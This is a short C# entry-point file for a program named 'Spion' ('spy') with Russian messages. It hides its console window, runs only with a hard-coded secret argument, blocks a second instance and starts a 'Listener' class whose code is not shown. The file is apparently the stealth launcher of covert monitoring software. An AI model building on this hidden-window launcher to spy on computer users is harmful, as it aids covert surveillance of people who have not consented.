using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Spion
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static Listener Listener;
        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
            if (args.Length == 1 && args[0] == "fsdhjfweohfgdnsvklhstsdfax")
            {
                var processes = Process.GetProcessesByName("Spion");
                if (processes.Length > 1)
                {
                    MessageBox.Show("Шпион уже запущен " + processes[0].ProcessName, "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Process.GetCurrentProcess().Kill();
                }
                else
                {
                    new Listener();
                }
            }
            else
            {
                MessageBox.Show("Неверный аргумент запуска");
                Process.GetCurrentProcess().Kill();
            }
            Application.Run();
        }
        
    }
}